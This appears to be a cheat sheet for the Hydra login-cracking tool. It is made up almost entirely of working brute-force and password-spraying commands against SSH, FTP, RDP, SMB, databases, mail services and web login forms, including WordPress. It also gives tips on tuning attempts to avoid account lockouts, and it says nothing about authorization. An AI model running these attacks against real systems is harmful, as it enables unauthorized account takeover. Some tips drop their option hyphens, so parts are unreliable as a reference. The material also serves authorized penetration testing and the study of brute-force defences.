## Basic Syntax

bash

```Plain
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] server service [OPTIONS]
```

## Target Specification Options

### Single Target

bash

```Plain
hydra -l user -P pass.txt 192.168.1.1 ssh
```

### Multiple Targets from File

bash

```Plain
hydra -L users.txt -P passes.txt -M targets.txt ssh
```

### Target File Format

bash

```Plain
# targets.txt
192.168.1.1
192.168.1.2:2222
10.0.0.1
```

## Authentication Options

### Username/Password Combinations

bash

```Plain
-l username          # Single username
-L userfile.txt      # Username list
-p password          # Single password
-P passfile.txt      # Password list
-C combo.txt         # colon-separated "user:pass" file
-e nsr               # Additional checks:
                    # n - null password
                    # s - login as password
                    # r - reversed login
```

## Protocol Modules

### Common Services

bash

```Plain
# SSH
hydra -L users.txt -P passes.txt target.com ssh

# FTP
hydra -L users.txt -P passes.txt target.com ftp

# HTTP/HTTPS
hydra -L users.txt -P passes.txt target.com http-get /protected/
hydra -L users.txt -P passes.txt target.com https-post-form "/login:user=^USER^&pass=^PASS^"

# SMB/Windows
hydra -L users.txt -P passes.txt target.com smb

# MySQL
hydra -L users.txt -P passes.txt target.com mysql

# RDP
hydra -L users.txt -P passes.txt target.com rdp

# Telnet
hydra -L users.txt -P passes.txt target.com telnet
```

## HTTP/HTTPS Specific Options

### GET Requests

bash

```Plain
hydra -L users.txt -P passes.txt target.com http-get /admin/
```

### POST Form Attacks

bash

```Plain
# Basic form
hydra -L users.txt -P passes.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# With cookies
hydra -L users.txt -P passes.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:H=Cookie: session=abc123:F=error"

# With custom headers
hydra -L users.txt -P passes.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:H=User-Agent: Mozilla/5.0:X-Forwarded-For: 127.0.0.1"
```

### Success/Failure Detection

bash

```Plain
:S=success_pattern    # Success string
:F=failure_pattern    # Failure string
:C=condition          # Custom condition
```

## Performance Tuning Options

### Parallelism

bash

```Plain
-t 64                # Number of parallel tasks (default: 16)
-T 64                # Parallel tasks per target (with -M)
```

### Timing Controls

bash

```Plain
-w 10               # Wait time between attempts (seconds)
-W 5                # Wait time for responses (seconds)
-f                  # Stop after first valid login
```

### Connection Options

bash

```Plain
-s 2222             # Custom port
-4 / -6             # IPv4 or IPv6
-S                  # Use SSL
```

## Advanced Features

### Password Generation

bash

```Plain
-x min:max:charset   # Generate passwords on-the-fly
```

Examples:

bash

```Plain
-x 6:8:a             # 6-8 char lowercase
-x 4:6:A1            # 4-6 char uppercase + digits
-x 8:8:aA1!          # 8 char mixed + special
```

### Resume Sessions

bash

```Plain
-R                  # Restore previous session
-o output.txt       # Save results to file
-b json             # Output format (text, json, jsonv1)
```

### Verbosity & Debugging

bash

```Plain
-v / -V             # Verbose mode
-d                  # Debug mode
-u                  # Show usage per module
```

## Practical Examples

### Comprehensive SSH Attack

bash

```Plain
hydra -L users.txt -P passes.txt -e nsr -t 64 -w 5 -f -o results.txt -V target.com ssh
```

### HTTP Form with Complex Headers

bash

```Plain
hydra -L users.txt -P passes.txt target.com https-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:H=Cookie: wordpress_test_cookie=WP+Cookie+check|User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36:F=incorrect" -V -t 20 -w 3
```

### Password Spraying

bash

```Plain
# Few passwords against many users
hydra -L users.txt -p "Spring2024!" -t 10 -w 2 target.com ssh
```

### Service Detection + Attack

bash

```Plain
# First detect services, then attack
nmap -p 21,22,23,80,443 target.com
hydra -L users.txt -P passes.txt -M open_ports.txt -t 10 ssh,ftp,telnet
```

## Module-Specific Syntax

### HTTP Basic Auth

bash

```Plain
hydra -L users.txt -P passes.txt target.com http-get /protected-area/
```

### HTTP Digest Auth

bash

```Plain
hydra -L users.txt -P passes.txt target.com http-head /realm/
```

### POP3

bash

```Plain
hydra -L emails.txt -P passes.txt target.com pop3
```

### IMAP

bash

```Plain
hydra -L emails.txt -P passes.txt target.com imap
```

## Pro Tips & Best Practices

1. **Always check rate limiting**: Use `w` to avoid locks

1. **Test failure patterns first**: Manual testing ensures correct `:F=` strings

1. **Use appropriate thread counts**: `t 16` for most cases, lower for sensitive services

1. **Save your work**: `o results.txt` and `R` to resume

1. **Combine with other tools**: Use `nmap` for service discovery first

## Common Mistakes to Avoid

❌ Using too many parallel threads (`-t 256`)

❌ Incorrect failure/success strings

❌ Forgetting SSL (`-S` or `https-` prefix)

❌ Not testing manually first

❌ Ignoring rate limiting